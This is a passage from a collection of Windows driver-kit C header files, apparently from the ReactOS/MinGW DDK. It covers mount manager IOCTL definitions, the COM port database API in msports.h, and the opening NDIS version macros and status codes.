#define MOUNTMGR_DOS_DEVICE_NAME L"\\\\.\\MountPointManager"
#define MOUNTMGRCONTROLTYPE ((ULONG) 'm')
#define MOUNTDEVCONTROLTYPE ((ULONG) 'M')

#define IOCTL_MOUNTMGR_DEFINE_UNIX_DRIVE CTL_CODE(MOUNTMGRCONTROLTYPE, 32, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_QUERY_UNIX_DRIVE  CTL_CODE(MOUNTMGRCONTROLTYPE, 33, METHOD_BUFFERED, FILE_READ_ACCESS)

struct mountmgr_unix_drive {
  ULONG  size;
  ULONG  type;
  WCHAR  letter;
  USHORT mount_point_offset;
  USHORT device_offset;
};

#define IOCTL_MOUNTMGR_CREATE_POINT \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 0, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_DELETE_POINTS \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 1, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_QUERY_POINTS \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MOUNTMGR_DELETE_POINTS_DBONLY \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 3, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_NEXT_DRIVE_LETTER \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 4, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_AUTO_DL_ASSIGNMENTS \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 5, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_VOLUME_MOUNT_POINT_CREATED \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 6, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_VOLUME_MOUNT_POINT_DELETED \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 7, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_CHANGE_NOTIFY \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 8, METHOD_BUFFERED, FILE_READ_ACCESS)
#define IOCTL_MOUNTMGR_KEEP_LINKS_WHEN_OFFLINE \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 9, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_CHECK_UNPROCESSED_VOLUMES \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 10, METHOD_BUFFERED, FILE_READ_ACCESS)
#define IOCTL_MOUNTMGR_VOLUME_ARRIVAL_NOTIFICATION \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 11, METHOD_BUFFERED, FILE_READ_ACCESS)
#define IOCTL_MOUNTDEV_QUERY_DEVICE_NAME \
  CTL_CODE(MOUNTDEVCONTROLTYPE, 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define MOUNTMGR_IS_DRIVE_LETTER(s) ((s)->Length == 28 && (s)->Buffer[0] == '\\' && (s)->Buffer[1] == 'D' && \
                                     (s)->Buffer[2] == 'o' && (s)->Buffer[3] == 's' && (s)->Buffer[4] == 'D' && \
                                     (s)->Buffer[5] == 'e' && (s)->Buffer[6] == 'v' && (s)->Buffer[7] == 'i' && \
                                     (s)->Buffer[8] == 'c' && (s)->Buffer[9] == 'e' && (s)->Buffer[10] == 's' && \
                                     (s)->Buffer[11] == '\\' && (s)->Buffer[12] >= 'A' && \
                                     (s)->Buffer[12] <= 'Z' && (s)->Buffer[13] == ':')

#define MOUNTMGR_IS_VOLUME_NAME(s) (((s)->Length == 96 || ((s)->Length == 98 && (s)->Buffer[48] == '\\')) && \
                                     (s)->Buffer[0] == '\\'&& ((s)->Buffer[1] == '?' || (s)->Buffer[1] == '\\') && \
                                     (s)->Buffer[2] == '?' && (s)->Buffer[3] == '\\' && (s)->Buffer[4] == 'V' && \
                                     (s)->Buffer[5] == 'o' && (s)->Buffer[6] == 'l' && (s)->Buffer[7] == 'u' && \
                                     (s)->Buffer[8] == 'm' && (s)->Buffer[9] == 'e' && (s)->Buffer[10] == '{' &&  \
                                     (s)->Buffer[19] == '-' && (s)->Buffer[24] == '-' && (s)->Buffer[29] == '-' && \
                                     (s)->Buffer[34] == '-' && (s)->Buffer[47] == '}')

typedef struct _MOUNTMGR_CREATE_POINT_INPUT {
  USHORT SymbolicLinkNameOffset;
  USHORT SymbolicLinkNameLength;
  USHORT DeviceNameOffset;
  USHORT DeviceNameLength;
} MOUNTMGR_CREATE_POINT_INPUT, *PMOUNTMGR_CREATE_POINT_INPUT;

typedef struct _MOUNTMGR_MOUNT_POINT {
  ULONG SymbolicLinkNameOffset;
  USHORT SymbolicLinkNameLength;
  ULONG UniqueIdOffset;
  USHORT UniqueIdLength;
  ULONG DeviceNameOffset;
  USHORT DeviceNameLength;
} MOUNTMGR_MOUNT_POINT, *PMOUNTMGR_MOUNT_POINT;

typedef struct _MOUNTMGR_MOUNT_POINTS {
  ULONG Size;
  ULONG NumberOfMountPoints;
  MOUNTMGR_MOUNT_POINT MountPoints[1];
} MOUNTMGR_MOUNT_POINTS, *PMOUNTMGR_MOUNT_POINTS;

typedef struct _MOUNTMGR_DRIVE_LETTER_TARGET {
  USHORT DeviceNameLength;
  WCHAR DeviceName[1];
} MOUNTMGR_DRIVE_LETTER_TARGET, *PMOUNTMGR_DRIVE_LETTER_TARGET;

typedef struct _MOUNTMGR_DRIVE_LETTER_INFORMATION {
  BOOLEAN DriveLetterWasAssigned;
  UCHAR CurrentDriveLetter;
} MOUNTMGR_DRIVE_LETTER_INFORMATION, *PMOUNTMGR_DRIVE_LETTER_INFORMATION;

typedef struct _MOUNTMGR_VOLUME_MOUNT_POINT {
  USHORT SourceVolumeNameOffset;
  USHORT SourceVolumeNameLength;
  USHORT TargetVolumeNameOffset;
  USHORT TargetVolumeNameLength;
} MOUNTMGR_VOLUME_MOUNT_POINT, *PMOUNTMGR_VOLUME_MOUNT_POINT;

typedef struct _MOUNTMGR_CHANGE_NOTIFY_INFO {
  ULONG EpicNumber;
} MOUNTMGR_CHANGE_NOTIFY_INFO, *PMOUNTMGR_CHANGE_NOTIFY_INFO;

typedef struct _MOUNTMGR_TARGET_NAME {
  USHORT DeviceNameLength;
  WCHAR DeviceName[1];
} MOUNTMGR_TARGET_NAME, *PMOUNTMGR_TARGET_NAME;

typedef struct _MOUNTDEV_NAME {
  USHORT NameLength;
  WCHAR Name[1];
} MOUNTDEV_NAME, *PMOUNTDEV_NAME;

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

#define IOCTL_MOUNTMGR_QUERY_DOS_VOLUME_PATH \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 12, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MOUNTMGR_QUERY_DOS_VOLUME_PATHS \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 13, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define MOUNTMGR_IS_DOS_VOLUME_NAME(s) (MOUNTMGR_IS_VOLUME_NAME(s) && (s)->Length == 96 && (s)->Buffer[1] == '\\')
#define MOUNTMGR_IS_DOS_VOLUME_NAME_WB(s) (MOUNTMGR_IS_VOLUME_NAME(s) && (s)->Length == 98 && (s)->Buffer[1] == '\\')
#define MOUNTMGR_IS_NT_VOLUME_NAME(s) ( MOUNTMGR_IS_VOLUME_NAME(s) && (s)->Length == 96 && (s)->Buffer[1] == '?')
#define MOUNTMGR_IS_NT_VOLUME_NAME_WB(s) (MOUNTMGR_IS_VOLUME_NAME(s) && (s)->Length == 98 && (s)->Buffer[1] == '?')

typedef struct _MOUNTMGR_VOLUME_PATHS {
  ULONG MultiSzLength;
  WCHAR MultiSz[1];
} MOUNTMGR_VOLUME_PATHS, *PMOUNTMGR_VOLUME_PATHS;

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WS03)

#define IOCTL_MOUNTMGR_SCRUB_REGISTRY \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 14, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_QUERY_AUTO_MOUNT \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 15, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MOUNTMGR_SET_AUTO_MOUNT \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 16, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

typedef enum _MOUNTMGR_AUTO_MOUNT_STATE {
  Disabled = 0,
  Enabled
} MOUNTMGR_AUTO_MOUNT_STATE;

typedef struct _MOUNTMGR_QUERY_AUTO_MOUNT {
  MOUNTMGR_AUTO_MOUNT_STATE CurrentState;
} MOUNTMGR_QUERY_AUTO_MOUNT, *PMOUNTMGR_QUERY_AUTO_MOUNT;

typedef struct _MOUNTMGR_SET_AUTO_MOUNT {
  MOUNTMGR_AUTO_MOUNT_STATE NewState;
} MOUNTMGR_SET_AUTO_MOUNT, *PMOUNTMGR_SET_AUTO_MOUNT;

#endif /* (NTDDI_VERSION >= NTDDI_WS03) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

#define IOCTL_MOUNTMGR_BOOT_DL_ASSIGNMENT \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 17, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MOUNTMGR_TRACELOG_CACHE \
  CTL_CODE(MOUNTMGRCONTROLTYPE, 18, METHOD_BUFFERED, FILE_READ_ACCESS)

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#endif /* _MOUNTMGR_ */


```

`include/ddk/msports.h`:

```h
#ifndef _MSPORTS_
#define _MSPORTS_

#ifdef __cplusplus
extern "C" {
#endif

DECLARE_HANDLE(HCOMDB);
typedef HCOMDB *PHCOMDB;
#define HCOMDB_INVALID_HANDLE_VALUE ((HCOMDB)INVALID_HANDLE_VALUE)

/* Limits for ComDBResizeDatabase NewSize */
#define COMDB_MIN_PORTS_ARBITRATED 256
#define COMDB_MAX_PORTS_ARBITRATED 4096

/* ReportType flags for ComDBGetCurrentPortUsage */
#define CDB_REPORT_BITS  0x0
#define CDB_REPORT_BYTES 0x1

LONG
WINAPI
ComDBClaimNextFreePort(IN HCOMDB hComDB,
                       OUT LPDWORD ComNumber);

LONG
WINAPI
ComDBClaimPort(IN HCOMDB hComDB,
               IN DWORD ComNumber,
               IN BOOL ForceClaim,
               OUT PBOOL Forced);

LONG
WINAPI
ComDBClose(IN HCOMDB hComDB);

LONG
WINAPI
ComDBGetCurrentPortUsage(IN HCOMDB hComDB,
                         OUT PBYTE Buffer,
                         IN DWORD BufferSize,
                         IN DWORD ReportType,
                         OUT LPDWORD MaxPortsReported);

LONG
WINAPI
ComDBOpen(OUT HCOMDB *phComDB);

LONG
WINAPI
ComDBReleasePort(IN HCOMDB hComDB,
                 IN DWORD ComNumber);

LONG
WINAPI
ComDBResizeDatabase(IN HCOMDB hComDB,
                    IN DWORD NewSize);

#ifdef __cplusplus
}
#endif

#endif /* _MSPORTS_ */

```

`include/ddk/ndis.h`:

```h
/*
 * ndis.h
 *
 * Network Device Interface Specification definitions
 *
 * This file is part of the ReactOS DDK package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * DEFINES: i386                 - Target platform is i386
 *          NDIS_WRAPPER         - Define only for NDIS library
 *          NDIS_MINIPORT_DRIVER - Define only for NDIS miniport drivers
 *          NDIS40               - Use NDIS 4.0 structures by default
 *          NDIS50               - Use NDIS 5.0 structures by default
 *          NDIS51               - Use NDIS 5.1 structures by default
 *          NDIS40_MINIPORT      - Building NDIS 4.0 miniport driver
 *          NDIS50_MINIPORT      - Building NDIS 5.0 miniport driver
 *          NDIS51_MINIPORT      - Building NDIS 5.1 miniport driver
 */

#ifndef _NDIS_
#define _NDIS_

#ifndef NDIS_WDM
#define NDIS_WDM 0
#endif

#include "ntddk.h"
#include "netpnp.h"
#include "ntstatus.h"
#include "netevent.h"
#include <qos.h>

typedef int NDIS_STATUS, *PNDIS_STATUS;

#include "ntddndis.h"

#if !defined(_WINDEF_H)
typedef unsigned int UINT, *PUINT;
#endif

#ifdef __cplusplus
extern "C" {
#endif

#ifndef __NET_PNP__
#define __NET_PNP__

typedef enum _NET_DEVICE_POWER_STATE {
  NetDeviceStateUnspecified = 0,
  NetDeviceStateD0,
  NetDeviceStateD1,
  NetDeviceStateD2,
  NetDeviceStateD3,
  NetDeviceStateMaximum
} NET_DEVICE_POWER_STATE, *PNET_DEVICE_POWER_STATE;

typedef enum _NET_PNP_EVENT_CODE {
  NetEventSetPower,
  NetEventQueryPower,
  NetEventQueryRemoveDevice,
  NetEventCancelRemoveDevice,
  NetEventReconfigure,
  NetEventBindList,
  NetEventBindsComplete,
  NetEventPnPCapabilities,
  NetEventPause,
  NetEventRestart,
  NetEventPortActivation,
  NetEventPortDeactivation,
  NetEventIMReEnableDevice,
  NetEventMaximum
} NET_PNP_EVENT_CODE, *PNET_PNP_EVENT_CODE;

typedef struct _NET_PNP_EVENT {
  NET_PNP_EVENT_CODE NetEvent;
  PVOID Buffer;
  ULONG BufferLength;
  ULONG_PTR NdisReserved[4];
  ULONG_PTR TransportReserved[4];
  ULONG_PTR TdiReserved[4];
  ULONG_PTR TdiClientReserved[4];
} NET_PNP_EVENT, *PNET_PNP_EVENT;

#endif /* __NET_PNP__ */

#if !defined(NDIS_WRAPPER)

#if (defined(NDIS_MINIPORT_MAJOR_VERSION) ||  \
    (defined(NDIS_MINIPORT_MINOR_VERSION)) || \
    (defined(NDIS_PROTOCOL_MAJOR_VERSION)) || \
    (defined(NDIS_PROTOCOL_MINOR_VERSION)) || \
    (defined(NDIS_FILTER_MAJOR_VERSION)) ||   \
    (defined(NDIS_FILTER_MINOR_VERSION)))
#error "Driver should not redefine NDIS reserved macros"
#endif

#if defined(NDIS_MINIPORT_DRIVER)

#if defined(NDIS620_MINIPORT)
#define NDIS_MINIPORT_MAJOR_VERSION 6
#define NDIS_MINIPORT_MINOR_VERSION 20
#elif defined(NDIS61_MINIPORT)
#define NDIS_MINIPORT_MAJOR_VERSION 6
#define NDIS_MINIPORT_MINOR_VERSION 1
#elif defined(NDIS60_MINIPORT)
#define NDIS_MINIPORT_MAJOR_VERSION 6
#define NDIS_MINIPORT_MINOR_VERSION 0
#elif defined(NDIS51_MINIPORT)
#define NDIS_MINIPORT_MAJOR_VERSION 5
#define NDIS_MINIPORT_MINOR_VERSION 1
#elif defined(NDIS50_MINIPORT)
#define NDIS_MINIPORT_MAJOR_VERSION 5
#define NDIS_MINIPORT_MINOR_VERSION 0
#else
#error "Only NDIS miniport drivers with version >= 5 are supported"
#endif

#if ((NDIS_MINIPORT_MAJOR_VERSION == 6) &&    \
       (NDIS_MINIPORT_MINOR_VERSION != 20) && \
       (NDIS_MINIPORT_MINOR_VERSION != 1) &&  \
       (NDIS_MINIPORT_MINOR_VERSION != 0))
#error "Invalid miniport major/minor version combination"
#elif ((NDIS_MINIPORT_MAJOR_VERSION == 5) &&  \
       (NDIS_MINIPORT_MINOR_VERSION != 1) &&  \
       (NDIS_MINIPORT_MINOR_VERSION != 0))
#error "Invalid miniport major/minor version combination"
#endif

#if  (NDIS_MINIPORT_MAJOR_VERSION == 6) && \
     ((NDIS_MINIPORT_MINOR_VERSION == 20 && NTDDI_VERSION < NTDDI_WIN7)  || \
      (NDIS_MINIPORT_MINOR_VERSION == 1 && NTDDI_VERSION < NTDDI_VISTA) || \
      (NDIS_MINIPORT_MINOR_VERSION == 0 && NTDDI_VERSION < NTDDI_VISTA))
#error "Wrong NDIS/DDI version"
#elif ((NDIS_MINIPORT_MAJOR_VERSION == 5) && \
       (((NDIS_MINIPORT_MINOR_VERSION == 1) && (NTDDI_VERSION < NTDDI_WINXP)) || \
         ((NDIS_MINIPORT_MINOR_VERSION == 0) && (NTDDI_VERSION < NTDDI_WIN2K))))
#error "Wrong NDIS/DDI version"
#endif


#endif /* defined(NDIS_MINIPORT_DRIVER) */

#if defined(NDIS30)
#error "Only NDIS Protocol drivers version 4 or later are supported"
#endif

#if defined(NDIS620)
#define NDIS_PROTOCOL_MAJOR_VERSION 6
#define NDIS_PROTOCOL_MINOR_VERSION 20
#define NDIS_FILTER_MAJOR_VERSION 6
#define NDIS_FILTER_MINOR_VERSION 20
#elif defined(NDIS61)
#define NDIS_PROTOCOL_MAJOR_VERSION 6
#define NDIS_PROTOCOL_MINOR_VERSION 1
#define NDIS_FILTER_MAJOR_VERSION 6
#define NDIS_FILTER_MINOR_VERSION 1
#elif defined(NDIS60)
#define NDIS_PROTOCOL_MAJOR_VERSION 6
#define NDIS_PROTOCOL_MINOR_VERSION 0
#define NDIS_FILTER_MAJOR_VERSION 6
#define NDIS_FILTER_MINOR_VERSION 0
#elif defined(NDIS51)
#define NDIS_PROTOCOL_MAJOR_VERSION 5
#define NDIS_PROTOCOL_MINOR_VERSION 1
#elif defined(NDIS50)
#define NDIS_PROTOCOL_MAJOR_VERSION 5
#define NDIS_PROTOCOL_MINOR_VERSION 0
#elif defined(NDIS40)
#define NDIS_PROTOCOL_MAJOR_VERSION 4
#define NDIS_PROTOCOL_MINOR_VERSION 0
#endif

#if !defined(NDIS_MINIPORT_DRIVER) && !defined(NDIS_PROTOCOL_MAJOR_VERSION)
#define NDIS40
#define NDIS_PROTOCOL_MAJOR_VERSION 4
#define NDIS_PROTOCOL_MINOR_VERSION 0
#endif

#if defined(NDIS_FILTER_MAJOR_VERSION)

#if ((NDIS_FILTER_MAJOR_VERSION == 6) &&  \
     (NDIS_FILTER_MINOR_VERSION != 20) && \
     (NDIS_FILTER_MINOR_VERSION != 1) &&  \
     (NDIS_FILTER_MINOR_VERSION != 0))
#error "Invalid Filter version"
#endif

#endif /* defined(NDIS_FILTER_MAJOR_VERSION) */


#if defined(NDIS_PROTOCOL_MAJOR_VERSION)

#if ((NDIS_PROTOCOL_MAJOR_VERSION == 6) &&  \
     (NDIS_PROTOCOL_MINOR_VERSION != 20) && \
     (NDIS_PROTOCOL_MINOR_VERSION != 1) &&  \
     (NDIS_PROTOCOL_MINOR_VERSION != 0))
#error "Invalid Protocol version"
#elif ((NDIS_PROTOCOL_MAJOR_VERSION == 5) && \
     (NDIS_PROTOCOL_MINOR_VERSION != 1) && (NDIS_PROTOCOL_MINOR_VERSION != 0))
#error "Invalid Protocol version"
#elif ((NDIS_PROTOCOL_MAJOR_VERSION == 4) && (NDIS_PROTOCOL_MINOR_VERSION != 0))
#error "Invalid Protocol major/minor version"
#endif

#if ((NDIS_PROTOCOL_MAJOR_VERSION == 6) && (NTDDI_VERSION < NTDDI_VISTA))
#error "Wrong NDIS/DDI version"
#endif

#endif /* defined(NDIS_PROTOCOL_MAJOR_VERSION) */

#endif /* !defined(NDIS_WRAPPER) */

#if !defined(NDIS_LEGACY_MINIPORT)

#if ((defined(NDIS_MINIPORT_DRIVER) && (NDIS_MINIPORT_MAJOR_VERSION < 6)) || NDIS_WRAPPER)
#define NDIS_LEGACY_MINIPORT    1
#else
#define NDIS_LEGACY_MINIPORT    0
#endif

#endif /* !defined(NDIS_LEGACY_MINIPORT) */

#if !defined(NDIS_LEGACY_PROTOCOL)

#if ((defined(NDIS_PROTOCOL_MAJOR_VERSION) && (NDIS_PROTOCOL_MAJOR_VERSION < 6)) || NDIS_WRAPPER)
#define NDIS_LEGACY_PROTOCOL    1
#else
#define NDIS_LEGACY_PROTOCOL    0
#endif

#endif /* !defined(NDIS_LEGACY_PROTOCOL) */

#if !defined(NDIS_LEGACY_DRIVER)

#if (NDIS_LEGACY_MINIPORT || NDIS_LEGACY_PROTOCOL || NDIS_WRAPPER)
#define NDIS_LEGACY_DRIVER      1
#else
#define NDIS_LEGACY_DRIVER      0
#endif

#endif /* !defined(NDIS_LEGACY_DRIVER) */

#if !defined(NDIS_SUPPORT_NDIS6)

#if ((defined (NDIS_MINIPORT_MAJOR_VERSION) && (NDIS_MINIPORT_MAJOR_VERSION >= 6)) || \
     (defined (NDIS60)) || NDIS_WRAPPER)
#define NDIS_SUPPORT_NDIS6      1
#else
#define NDIS_SUPPORT_NDIS6      0
#endif

#endif /* !defined(NDIS_SUPPORT_NDIS6) */

#if !defined(NDIS_SUPPORT_NDIS61)
#if  (((defined (NDIS_MINIPORT_MAJOR_VERSION) && (NDIS_MINIPORT_MAJOR_VERSION >= 6)) && \
       (defined (NDIS_MINIPORT_MINOR_VERSION) && (NDIS_MINIPORT_MINOR_VERSION >= 1))) || \
      (defined (NDIS61)) || NDIS_WRAPPER)
#define NDIS_SUPPORT_NDIS61      1
#else
#define NDIS_SUPPORT_NDIS61      0
#endif
#endif /* !defined(NDIS_SUPPORT_NDIS61) */

#if !defined(NDIS_SUPPORT_NDIS620)

#if  (((defined (NDIS_MINIPORT_MAJOR_VERSION) && (NDIS_MINIPORT_MAJOR_VERSION >= 6)) && \
       (defined (NDIS_MINIPORT_MINOR_VERSION) && (NDIS_MINIPORT_MINOR_VERSION >= 20))) || \
      (defined (NDIS620)) || NDIS_WRAPPER)
#define NDIS_SUPPORT_NDIS620      1
#else
#define NDIS_SUPPORT_NDIS620      0
#endif

#endif /* !defined(NDIS_SUPPORT_NDIS620) */

#if (NDIS_SUPPORT_NDIS620)
#undef NDIS_SUPPORT_NDIS61
#define NDIS_SUPPORT_NDIS61 1
#endif

#if (NDIS_SUPPORT_NDIS61)
#undef NDIS_SUPPORT_NDIS6
#define NDIS_SUPPORT_NDIS6 1
#endif

#if defined(NDIS61_MINIPORT) || defined(NDIS60_MINIPORT) || defined(NDIS61) || \
    defined(NDIS60) || defined(NDIS_WRAPPER) || defined(NDIS_LEGACY_DRIVER)
#define NDIS_SUPPORT_60_COMPATIBLE_API      1
#else
#define NDIS_SUPPORT_60_COMPATIBLE_API      0
#endif

#if defined(NDIS_WRAPPER)
#define NDISAPI
#else
#define NDISAPI DECLSPEC_IMPORT
#endif

typedef PVOID QUEUED_CLOSE; //FIXME : Doesn't exist in public headers

typedef struct _X_FILTER FDDI_FILTER, *PFDDI_FILTER;
typedef struct _X_FILTER TR_FILTER, *PTR_FILTER;
typedef struct _X_FILTER NULL_FILTER, *PNULL_FILTER;

typedef struct _NDIS_MINIPORT_BLOCK NDIS_MINIPORT_BLOCK, *PNDIS_MINIPORT_BLOCK;

typedef struct _REFERENCE {
  KSPIN_LOCK SpinLock;
  USHORT ReferenceCount;
  BOOLEAN Closing;
} REFERENCE, *PREFERENCE;

/* NDIS base types */

typedef struct _NDIS_SPIN_LOCK {
  KSPIN_LOCK SpinLock;
  KIRQL OldIrql;
} NDIS_SPIN_LOCK, *PNDIS_SPIN_LOCK;

typedef struct _NDIS_EVENT {
  KEVENT Event;
} NDIS_EVENT, *PNDIS_EVENT;

typedef PVOID NDIS_HANDLE, *PNDIS_HANDLE;

typedef ANSI_STRING NDIS_ANSI_STRING, *PNDIS_ANSI_STRING;
typedef UNICODE_STRING NDIS_STRING, *PNDIS_STRING;

typedef MDL NDIS_BUFFER, *PNDIS_BUFFER;

/* NDIS_STATUS constants */
#define NDIS_STATUS_SUCCESS                     ((NDIS_STATUS)STATUS_SUCCESS)
#define NDIS_STATUS_PENDING                     ((NDIS_STATUS)STATUS_PENDING)
#define NDIS_STATUS_NOT_RECOGNIZED              ((NDIS_STATUS)0x00010001L)
#define NDIS_STATUS_NOT_COPIED                  ((NDIS_STATUS)0x00010002L)
#define NDIS_STATUS_NOT_ACCEPTED                ((NDIS_STATUS)0x00010003L)
#define NDIS_STATUS_CALL_ACTIVE                 ((NDIS_STATUS)0x00010007L)
#define NDIS_STATUS_INDICATION_REQUIRED         ((NDIS_STATUS)STATUS_NDIS_INDICATION_REQUIRED)
#define NDIS_STATUS_ONLINE                      ((NDIS_STATUS)0x40010003L)
#define NDIS_STATUS_RESET_START                 ((NDIS_STATUS)0x40010004L)
#define NDIS_STATUS_RESET_END                   ((NDIS_STATUS)0x40010005L)
#define NDIS_STATUS_RING_STATUS                 ((NDIS_STATUS)0x40010006L)
#define NDIS_STATUS_CLOSED                      ((NDIS_STATUS)0x40010007L)
#define NDIS_STATUS_WAN_LINE_UP                 ((NDIS_STATUS)0x40010008L)
#define NDIS_STATUS_WAN_LINE_DOWN               ((NDIS_STATUS)0x40010009L)
#define NDIS_STATUS_WAN_FRAGMENT                ((NDIS_STATUS)0x4001000AL)
#define NDIS_STATUS_MEDIA_CONNECT               ((NDIS_STATUS)0x4001000BL)
#define NDIS_STATUS_MEDIA_DISCONNECT            ((NDIS_STATUS)0x4001000CL)
#define NDIS_STATUS_HARDWARE_LINE_UP            ((NDIS_STATUS)0x4001000DL)
#define NDIS_STATUS_HARDWARE_LINE_DOWN          ((NDIS_STATUS)0x4001000EL)
#define NDIS_STATUS_INTERFACE_UP                ((NDIS_STATUS)0x4001000FL)
#define NDIS_STATUS_INTERFACE_DOWN              ((NDIS_STATUS)0x40010010L)
#define NDIS_STATUS_MEDIA_BUSY                  ((NDIS_STATUS)0x40010011L)
#define NDIS_STATUS_MEDIA_SPECIFIC_INDICATION   ((NDIS_STATUS)0x40010012L)
#define NDIS_STATUS_WW_INDICATION               NDIS_STATUS_MEDIA_SPECIFIC_INDICATION
#define NDIS_STATUS_LINK_SPEED_CHANGE           ((NDIS_STATUS)0x40010013L)
#define NDIS_STATUS_WAN_GET_STATS               ((NDIS_STATUS)0x40010014L)
#define NDIS_STATUS_WAN_CO_FRAGMENT             ((NDIS_STATUS)0x40010015L)
#define NDIS_STATUS_WAN_CO_LINKPARAMS           ((NDIS_STATUS)0x40010016L)
#if NDIS_SUPPORT_NDIS6
#define NDIS_STATUS_LINK_STATE                  ((NDIS_STATUS)0x40010017L)
#define NDIS_STATUS_NETWORK_CHANGE              ((NDIS_STATUS)0x40010018L)
#define NDIS_STATUS_MEDIA_SPECIFIC_INDICATION_EX ((NDIS_STATUS)0x40010019L)
#define NDIS_STATUS_PORT_STATE                  ((NDIS_STATUS)0x40010022L)
#define NDIS_STATUS_OPER_STATUS                 ((NDIS_STATUS)0x40010023L)
#define NDIS_STATUS_PACKET_FILTER               ((NDIS_STATUS)0x40010024L)
#endif /* NDIS_SUPPORT_NDIS6 */
#define NDIS_STATUS_WAN_CO_MTULINKPARAMS        ((NDIS_STATUS)0x40010025L)

#if NDIS_SUPPORT_NDIS6

#define NDIS_STATUS_IP_OPER_STATUS              ((NDIS_STATUS)0x40010026L)

#define NDIS_STATUS_OFFLOAD_PAUSE               ((NDIS_STATUS)0x40020001L)
#define NDIS_STATUS_UPLOAD_ALL                  ((NDIS_STATUS)0x40020002L)
#define NDIS_STATUS_OFFLOAD_RESUME              ((NDIS_STATUS)0x40020003L)
#define NDIS_STATUS_OFFLOAD_PARTIAL_SUCCESS     ((NDIS_STATUS)0x40020004L)
#define NDIS_STATUS_OFFLOAD_STATE_INVALID       ((NDIS_STATUS)0x40020005L)
#define NDIS_STATUS_TASK_OFFLOAD_CURRENT_CONFIG ((NDIS_STATUS)0x40020006L)
#define NDIS_STATUS_TASK_OFFLOAD_HARDWARE_CAPABILITIES ((NDIS_STATUS)0x40020007L)
#define NDIS_STATUS_OFFLOAD_ENCASPULATION_CHANGE ((NDIS_STATUS)0x40020008L)
#define NDIS_STATUS_TCP_CONNECTION_OFFLOAD_HARDWARE_CAPABILITIES ((NDIS_STATUS)0x4002000BL)

#if (NDIS_SUPPORT_NDIS61)
#define NDIS_STATUS_HD_SPLIT_CURRENT_CONFIG     ((NDIS_STATUS)0x4002000CL)
#endif

#if (NDIS_SUPPORT_NDIS620)
#define NDIS_STATUS_RECEIVE_QUEUE_STATE         ((NDIS_STATUS)0x4002000DL)
#endif

#define NDIS_STATUS_OFFLOAD_IM_RESERVED1        ((NDIS_STATUS)0x40020100L)
#define NDIS_STATUS_OFFLOAD_IM_RESERVED2        ((NDIS_STATUS)0x40020101L)
#define NDIS_STATUS_OFFLOAD_IM_RESERVED3        ((NDIS_STATUS)0x40020102L)

#define NDIS_STATUS_DOT11_SCAN_CONFIRM          ((NDIS_STATUS)0x40030000L)
#define NDIS_STATUS_DOT11_MPDU_MAX_LENGTH_CHANGED ((NDIS_STATUS)0x40030001L)
#define NDIS_STATUS_DOT11_ASSOCIATION_START     ((NDIS_STATUS)0x40030002L)
#define NDIS_STATUS_DOT11_ASSOCIATION_COMPLETION ((NDIS_STATUS)0x40030003L)
#define NDIS_STATUS_DOT11_CONNECTION_START      ((NDIS_STATUS)0x40030004L)
#define NDIS_STATUS_DOT11_CONNECTION_COMPLETION ((NDIS_STATUS)0x40030005L)
#define NDIS_STATUS_DOT11_ROAMING_START         ((NDIS_STATUS)0x40030006L)
#define NDIS_STATUS_DOT11_ROAMING_COMPLETION    ((NDIS_STATUS)0x40030007L)
